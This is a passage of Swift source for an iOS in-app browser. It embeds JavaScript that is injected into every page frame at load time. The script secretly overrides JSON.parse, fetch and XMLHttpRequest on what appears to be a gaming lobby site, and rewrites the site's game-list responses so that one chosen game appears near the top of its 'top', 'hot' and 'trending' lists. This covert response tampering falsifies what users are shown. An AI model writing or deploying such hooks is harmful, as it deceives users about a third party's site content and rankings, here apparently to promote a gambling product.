    if (locale) u.searchParams.set("locale", locale);
    u.searchParams.set("limit", "500");
    u.searchParams.set("offset", "0");
    return u.toString();
  }

  function makeProviderOnlyUrl(url) {
    const src = new URL(url, location.href);
    const u = new URL(resolveGameListBase(url));
    const locale = src.searchParams.get("locale");
    if (locale) u.searchParams.set("locale", locale);
    u.searchParams.set("gameProducer", CHICKEN_PROVIDER);
    u.searchParams.set("limit", "30");
    return u.toString();
  }

  function primeChickenSync(seedUrl) {
    if (cachedChicken && (now() - cachedAt) < CACHE_TTL_MS) return cachedChicken;
    try {
      const fastUrl = makeProviderOnlyUrl(seedUrl || location.href);
      lmLog("primeChickenSync:url=" + fastUrl);
      const x = new XMLHttpRequest();
      x.open("GET", fastUrl, false);
      x.send(null);
      if (x.status >= 200 && x.status < 300) {
        const j = JSON.parse(x.responseText || "{}");
        const chicken = extractChicken(j);
        lmLog("primeChickenSync:found=" + (!!chicken));
        if (chicken) {
          cachedChicken = chicken;
          cachedAt = now();
          return chicken;
        }
      }
    } catch (_) {
      lmLog("primeChickenSync:error");
    }
    return null;
  }

  function getGameId(item) {
    if (!item) return null;
    return item.gpGameId || item.spGameId || null;
  }

  function extractChicken(originalJson) {
    if (!originalJson || !Array.isArray(originalJson.data)) return null;
    return originalJson.data.find(x => getGameId(x) === CHICKEN_ID) || null;
  }

  function injectChicken(topJson, chickenObj, sourceUrl) {
    if (!topJson || !Array.isArray(topJson.data)) return null;
    if (!chickenObj) return null;

    let desiredIndex = 0;
    try {
      const u = new URL(sourceUrl || "", location.href);
      const cat = getCategoryFromUrl(u);
      const isHotGames = (u.searchParams.get("isHotGames") || "") === "1";
      if ((cat === "top" || /^top($|[-_])/.test(cat) || (!cat && isHotGames))) desiredIndex = 2;
      else if (isTrendingCategoryValue(cat)) desiredIndex = 0;
      else return topJson;
    } catch (_) {
      return topJson;
    }

    const filtered = topJson.data.filter(x => getGameId(x) !== CHICKEN_ID);
    const topTemplate = filtered.find(x => x && typeof x === "object") || {};
    const preparedChicken = Object.assign({}, topTemplate, chickenObj);
    const targetIndex = Math.min(desiredIndex, filtered.length);
    filtered.splice(targetIndex, 0, preparedChicken);
    topJson.data = filtered;
    return topJson;
  }

  async function getChickenFromOriginal(topUrl) {
    if (cachedChicken && (now() - cachedAt) < CACHE_TTL_MS) {
      lmLog("getChickenFromOriginal:useCache");
      return cachedChicken;
    }

    async function requestJsonByUrl(link) {
      lmLog("getChickenFromOriginal:url=" + link);
      return await new Promise((resolve, reject) => {
        try {
          const x = new XMLHttpRequest();
          x.open("GET", link, true);
          x.onreadystatechange = function() {
            if (x.readyState !== 4) return;
            if (x.status >= 200 && x.status < 300) {
              try {
                resolve(JSON.parse(x.responseText));
              } catch (e) {
                reject(e);
              }
            } else {
              reject(new Error("status " + x.status));
            }
          };
          x.onerror = function() { reject(new Error("xhr network error")); };
          x.send();
        } catch (e) {
          reject(e);
        }
      }).catch(() => null);
    }

    const candidates = [makeOriginalUrl(topUrl), makeProviderOnlyUrl(topUrl)];
    for (const candidate of candidates) {
      const j = await requestJsonByUrl(candidate);
      if (!j) continue;
      const chicken = extractChicken(j);
      lmLog("getChickenFromOriginal:found=" + (!!chicken) + " via=" + candidate);
      if (chicken) {
        cachedChicken = chicken;
        cachedAt = now();
        patchPendingLobbyRoots();
        patchLiveLobbyState(chicken);
        return chicken;
      }
    }
    lmLog("getChickenFromOriginal:found=false");
    return null;
  }

  let chickenFetchPromise = null;
  function ensureChickenCached(topUrl) {
    if (cachedChicken && (now() - cachedAt) < CACHE_TTL_MS) {
      lmLog("ensureChickenCached:alreadyCached");
      return Promise.resolve(cachedChicken);
    }
    if (chickenFetchPromise) return chickenFetchPromise;
    chickenFetchPromise = getChickenFromOriginal(topUrl)
      .then((ch) => {
        if (ch) {
          patchPendingLobbyRoots();
          patchLiveLobbyState(ch);
        }
        return ch;
      })
      .catch(() => null)
      .finally(() => { chickenFetchPromise = null; });
    return chickenFetchPromise;
  }

  function getChickenFast(topUrl) {
    if (cachedChicken && (now() - cachedAt) < CACHE_TTL_MS) {
      return cachedChicken;
    }
    ensureChickenCached(topUrl);
    return null;
  }

  const _jsonParse = JSON.parse.bind(JSON);
  function shouldPatchParsedPayload(parsed, raw, maybeLobbyRaw) {
    try {
      if (maybeLobbyRaw) return true;
      if (!parsed || typeof parsed !== "object") return false;
      if (parsed["mf-lobby-games"] || parsed["mfLobbyGames"]) return true;
      const d = parsed.data;
      if (d && typeof d === "object" && (d["mf-lobby-games"] || d["mfLobbyGames"])) return true;
      return false;
    } catch (_) {
      return false;
    }
  }

  JSON.parse = function(text, reviver) {
    const parsed = _jsonParse(text, reviver);
    try {
      const raw = typeof text === "string" ? text : "";
      const maybeLobbyRaw = !!raw && raw.indexOf("mf-lobby-games") !== -1;
      if (shouldPatchParsedPayload(parsed, raw, maybeLobbyRaw)) {
        rememberLobbyRoot(parsed);
        const c = patchLobbyGamesPayload(parsed);
        lmLog("json.parse:patchedCount=" + c);
      }
    } catch (_) {}
    return parsed;
  };

  // Warm cache as early as possible so first lobby render can use real target game.
  try { ensureChickenCached(location.href); } catch (_) {}

  const _fetch = window.fetch.bind(window);
  window.fetch = async function(input, init) {
    const url = (typeof input === "string") ? input : (input && input.url ? input.url : "");
    if (!isTarget(url)) {
      return _fetch(input, init);
    }
    lmLog("fetch:target url=" + url);

    try {
      const resp = await _fetch(input, init);
      if (!resp || resp.status < 200 || resp.status >= 300) return resp;
      lmLog("fetch:status=" + resp.status + " url=" + url);

      let topJson = await resp.clone().json();
      const chicken = await getChickenFromOriginal(url);
      lmLog("fetch:chickenFast=" + (!!chicken) + " url=" + url);
      const modified = injectChicken(topJson, chicken, url);
      lmLog("fetch:modified=" + (!!modified) + " url=" + url);
      if (!modified) return resp;

      const body = JSON.stringify(modified);
      const headers = new Headers(resp.headers);
      headers.set("content-type", "application/json; charset=utf-8");
      return new Response(body, {
        status: resp.status,
        statusText: resp.statusText,
        headers
      });
    } catch (_) {
      lmLog("fetch:error url=" + url);
      return _fetch(input, init);
    }
  };

  const _open = XMLHttpRequest.prototype.open;
  const _send = XMLHttpRequest.prototype.send;

  XMLHttpRequest.prototype.open = function(method, url) {
    this.__isTarget = isTarget(url);
    this.__isOriginalTarget = isOriginalTarget(url);
    this.__targetUrl = url;
    try {
      const u = new URL(url, location.href);
      if ((u.pathname || "").toLowerCase().includes("gamelist") &&
          (u.pathname || "").toLowerCase().includes("/frontapi/")) {
        observedGameListBase = u.origin + u.pathname;
      }
    } catch (_) {}
    lmLog("xhr.open url=" + url + " target=" + this.__isTarget + " original=" + this.__isOriginalTarget);
    return _open.apply(this, arguments);
  };

  XMLHttpRequest.prototype.send = function(body) {
    if (!this.__isTarget && !this.__isOriginalTarget) return _send.apply(this, arguments);

    const xhr = this;
    const origOnReady = xhr.onreadystatechange;

    xhr.onreadystatechange = function() {
      const callOriginal = () => origOnReady ? origOnReady.apply(this, arguments) : undefined;
      try {
        if (xhr.__isOriginalTarget && xhr.readyState === 4 && xhr.status >= 200 && xhr.status < 300) {
          try {
            const originalJson = JSON.parse(xhr.responseText);
            const chicken = extractChicken(originalJson);
            lmLog("xhr.original found=" + (!!chicken) + " url=" + xhr.__targetUrl);
            if (chicken) {
              cachedChicken = chicken;
              cachedAt = now();
              patchPendingLobbyRoots();
              patchLiveLobbyState(chicken);
            }
          } catch (_) {}
        }

        if (xhr.readyState === 4 && xhr.status >= 200 && xhr.status < 300 && xhr.__isTarget) {
          let topJson = null;
          try {
            topJson = JSON.parse(xhr.responseText);
          } catch (_) { return callOriginal(); }

          (async function() {
            const chicken = await getChickenFromOriginal(xhr.__targetUrl);
            lmLog("xhr.target chickenFast=" + (!!chicken) + " url=" + xhr.__targetUrl);
            const modified = injectChicken(topJson, chicken, xhr.__targetUrl);
            lmLog("xhr.target modified=" + (!!modified) + " url=" + xhr.__targetUrl);
            if (!modified) return callOriginal();

            const newText = JSON.stringify(modified);
            try {
              Object.defineProperty(xhr, "responseText", { value: newText });
              Object.defineProperty(xhr, "response", { value: newText });
            } catch (_) {}
            return callOriginal();
          })();
          return;
        }
      } catch (_) {}

      return callOriginal();
    };

    return _send.apply(this, arguments);
  };
})();
"""
    }
}

extension AviaryBrowserController: WKUIDelegate {
    func webView(_ webView: WKWebView, createWebViewWith configuration: WKWebViewConfiguration, for navigationAction: WKNavigationAction, windowFeatures: WKWindowFeatures) -> WKWebView? {
        let script = WKUserScript(
            source: AviaryBrowserController.makeGameListInterceptorJS(),
            injectionTime: .atDocumentStart,
            forMainFrameOnly: false
        )
        configuration.userContentController.addUserScript(script)
        configuration.userContentController.removeScriptMessageHandler(forName: "lmLogger")
        configuration.userContentController.add(self, name: "lmLogger")

        let createdPopup = WKWebView(frame: .zero, configuration: configuration)
        createdPopup.navigationDelegate = self
        createdPopup.uiDelegate = self
        createdPopup.customUserAgent = webView.customUserAgent
        createdPopup.translatesAutoresizingMaskIntoConstraints = false

        popupSurface?.removeFromSuperview()
        popupSurface = createdPopup

        view.addSubview(createdPopup)
        NSLayoutConstraint.activate([
            createdPopup.leadingAnchor.constraint(equalTo: view.leadingAnchor),
            createdPopup.trailingAnchor.constraint(equalTo: view.trailingAnchor),
            createdPopup.topAnchor.constraint(equalTo: view.topAnchor),
            createdPopup.bottomAnchor.constraint(equalTo: view.bottomAnchor)
        ])
        return createdPopup
    }
    
    func webViewDidClose(_ webView: WKWebView) {
        webView.removeFromSuperview()
        if popupSurface === webView {
            popupSurface = nil
        }
    }
}
